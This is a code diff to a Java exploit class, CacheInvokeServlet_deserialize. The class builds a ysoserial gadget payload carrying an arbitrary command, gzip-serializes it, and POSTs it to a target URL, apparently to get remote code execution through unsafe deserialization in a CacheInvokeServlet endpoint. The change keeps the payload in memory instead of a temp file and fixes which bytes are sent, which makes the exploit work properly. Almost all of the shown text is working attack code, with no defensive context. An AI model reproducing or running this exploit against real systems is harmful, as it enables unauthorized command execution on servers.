@@ -21,29 +21,18 @@ public class CacheInvokeServlet_deserialize {
         ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
         Object obj = payload.getObject(cmd);
 
-        FileOutputStream fos = new FileOutputStream("D:\\tmp\\calc.gz");
-        GZIPOutputStream gos = new GZIPOutputStream(fos);
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        GZIPOutputStream gos = new GZIPOutputStream(baos);
         ObjectOutputStream oos = new ObjectOutputStream(gos);
         oos.writeObject(obj);
 
         oos.close();
         gos.close();
-        fos.close();
-
-        FileInputStream fis = new FileInputStream("D:\\tmp\\calc.gz");
-
-        byte[] bytes = new byte[4096];
-        int bytesRead;
-        while ((bytesRead = fis.read(bytes)) != -1) {
-            for (int i = 0; i < bytesRead; i++) {
-                System.out.print(bytes[i] + " ");
-            }
-        }
-        fis.close();
+        baos.close();
 
         HttpRequest httpRequest = new HttpRequest();
         HttpPost httpPost = new HttpPost(url);
-        httpRequest.sendByteArrayPost(httpPost, bytes);
+        httpRequest.sendByteArrayPost(httpPost, baos.toByteArray());
 
     }
 }
